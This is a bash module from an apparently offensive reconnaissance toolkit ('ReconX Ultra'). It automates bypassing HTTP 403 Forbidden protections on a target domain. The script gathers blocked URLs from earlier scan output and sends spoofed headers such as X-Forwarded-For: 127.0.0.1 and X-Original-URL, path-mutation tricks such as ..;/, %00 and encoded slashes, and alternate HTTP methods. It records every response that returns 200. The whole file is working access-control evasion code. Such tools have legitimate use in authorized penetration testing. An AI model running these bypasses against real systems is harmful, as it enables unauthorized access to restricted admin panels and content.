#!/usr/bin/env bash
# ============================================================================
# ReconX Ultra — 403 Bypass Engine
# ============================================================================
# Attempts to bypass 403 Forbidden responses using:
#   - Header-based bypasses (403_header_payloads.txt)
#   - URL-based bypasses (403_url_payloads.txt)
#   - Method switching, path normalization
# ============================================================================

DOMAIN="${1:?Usage: bypass_403.sh <domain>}"
source "$(cd "$(dirname "${BASH_SOURCE[0]}")/../../core" && pwd)/common.sh"
source "${RECONX_CORE}/logger.sh"

init_target_dirs "$DOMAIN"
log_module_start "403 Bypass Engine" "$DOMAIN"
START_TIME="$(date +%s)"

EXPLOIT_DIR="${OUTPUT_DIR}/exploits"
mkdir -p "$EXPLOIT_DIR"

BYPASS_RESULTS="${EXPLOIT_DIR}/403_bypass_results.txt"
> "$BYPASS_RESULTS"

# Gather 403 URLs from various sources
TARGETS_403="${RECONX_TMP}/403_targets.txt"
> "$TARGETS_403"

# From admin panel discovery
[[ -f "${OUT_INTEL}/admin_panels.txt" ]] && grep '\[403\]' "${OUT_INTEL}/admin_panels.txt" | awk '{print $2}' >> "$TARGETS_403" 2>/dev/null
# From content discovery
[[ -f "${OUT_CONTENT}/all_discovered.txt" ]] && grep '\[403\]' "${OUT_CONTENT}/all_discovered.txt" | awk '{print $1}' >> "$TARGETS_403" 2>/dev/null
# From live hosts status
[[ -f "${OUT_LIVE}/status_403.txt" ]] && cat "${OUT_LIVE}/status_403.txt" >> "$TARGETS_403" 2>/dev/null

sort -u "$TARGETS_403" -o "$TARGETS_403"
TARGET_COUNT="$(count_lines "$TARGETS_403")"

if [[ "$TARGET_COUNT" -eq 0 ]]; then
    log_warn "No 403 targets found — skipping bypass"
    exit 0
fi

log_info "Testing ${TARGET_COUNT} 403-blocked URLs"

# ── Header-Based Bypass ─────────────────────────────────────────────────────
HEADER_PAYLOADS="${RECONX_WORDLISTS}/403_header_payloads.txt"

run_header_bypass() {
    local url="$1"
    if [[ ! -f "$HEADER_PAYLOADS" ]]; then return; fi

    while IFS= read -r header_line; do
        [[ -z "$header_line" || "$header_line" =~ ^# ]] && continue
        status="$(curl -s -o /dev/null -w '%{http_code}' --max-time 5 \
            -H "$header_line" "$url" 2>/dev/null)"
        if [[ "$status" == "200" ]]; then
            echo "[BYPASS-HEADER] $url | Header: $header_line" >> "$BYPASS_RESULTS"
        fi
    done < "$HEADER_PAYLOADS"

    # Standard bypass headers
    local bypass_headers=(
        "X-Originating-IP: 127.0.0.1"
        "X-Forwarded-For: 127.0.0.1"
        "X-Remote-IP: 127.0.0.1"
        "X-Remote-Addr: 127.0.0.1"
        "X-Client-IP: 127.0.0.1"
        "X-Real-IP: 127.0.0.1"
        "X-Custom-IP-Authorization: 127.0.0.1"
        "X-Forwarded-Host: localhost"
        "X-Original-URL: /"
        "X-Rewrite-URL: /"
        "Content-Length: 0"
    )

    for hdr in "${bypass_headers[@]}"; do
        status="$(curl -s -o /dev/null -w '%{http_code}' --max-time 5 \
            -H "$hdr" "$url" 2>/dev/null)"
        if [[ "$status" == "200" ]]; then
            echo "[BYPASS-HEADER] $url | Header: $hdr" >> "$BYPASS_RESULTS"
        fi
    done
}

# ── URL-Based Bypass ────────────────────────────────────────────────────────
URL_PAYLOADS="${RECONX_WORDLISTS}/403_url_payloads.txt"

run_url_bypass() {
    local url="$1"

    # Extract path from URL
    local path
    path="$(echo "$url" | sed 's|https\?://[^/]*||')"
    local base
    base="$(echo "$url" | grep -oP 'https?://[^/]+')"

    [[ -z "$base" || -z "$path" ]] && return

    # URL payload file techniques
    if [[ -f "$URL_PAYLOADS" ]]; then
        while IFS= read -r suffix; do
            [[ -z "$suffix" || "$suffix" =~ ^# ]] && continue
            test_url="${base}${path}${suffix}"
            status="$(curl -s -o /dev/null -w '%{http_code}' --max-time 5 "$test_url" 2>/dev/null)"
            if [[ "$status" == "200" ]]; then
                echo "[BYPASS-URL] $test_url" >> "$BYPASS_RESULTS"
            fi
        done < <(head -50 "$URL_PAYLOADS")
    fi

    # Built-in URL bypass techniques
    local url_tricks=(
        "${base}${path}/"
        "${base}${path}/."
        "${base}${path}..;/"
        "${base}${path}%20"
        "${base}${path}%09"
        "${base}${path}%00"
        "${base}${path}..%00"
        "${base}${path}#"
        "${base}${path}?"
        "${base}/${path//\//%2f}"
        "${base}${path};/"
    )

    for trick_url in "${url_tricks[@]}"; do
        status="$(curl -s -o /dev/null -w '%{http_code}' --max-time 5 "$trick_url" 2>/dev/null)"
        if [[ "$status" == "200" ]]; then
            echo "[BYPASS-URL] $trick_url" >> "$BYPASS_RESULTS"
        fi
    done
}

# ── Method-Based Bypass ─────────────────────────────────────────────────────
run_method_bypass() {
    local url="$1"
    local methods="GET POST PUT PATCH DELETE OPTIONS HEAD TRACE CONNECT"

    for method in $methods; do
        status="$(curl -s -o /dev/null -w '%{http_code}' --max-time 5 \
            -X "$method" "$url" 2>/dev/null)"
        if [[ "$status" == "200" && "$method" != "GET" ]]; then
            echo "[BYPASS-METHOD] $url | Method: $method" >> "$BYPASS_RESULTS"
        fi
    done
}

# ── Execute ──────────────────────────────────────────────────────────────────
CURRENT=0
MAX_TARGETS=50

while IFS= read -r url; do
    [[ -z "$url" ]] && continue
    CURRENT=$((CURRENT + 1))
    [[ "$CURRENT" -gt "$MAX_TARGETS" ]] && break

    log_task_start "Testing 403 bypass [${CURRENT}/${MAX_TARGETS}]: $(echo "$url" | cut -c1-50)..."

    run_header_bypass "$url"
    run_url_bypass "$url"
    run_method_bypass "$url"
done < "$TARGETS_403"

sort -u "$BYPASS_RESULTS" -o "$BYPASS_RESULTS"
BYPASS_COUNT="$(count_lines "$BYPASS_RESULTS")"

echo ""
echo -e "  ${BOLD}${WHITE}403 Bypass Results:${RESET}"
log_stats "Targets tested" "$TARGET_COUNT"
log_stats_final "Bypasses found" "$BYPASS_COUNT"

if [[ "$BYPASS_COUNT" -gt 0 ]]; then
    echo ""
    echo -e "  ${BG_RED}${WHITE} ⚠  ${BYPASS_COUNT} 403 bypass(es) confirmed! ${RESET}"
fi

rm -f "$TARGETS_403"
log_module_end "403 Bypass Engine" "$START_TIME" "$BYPASS_COUNT"
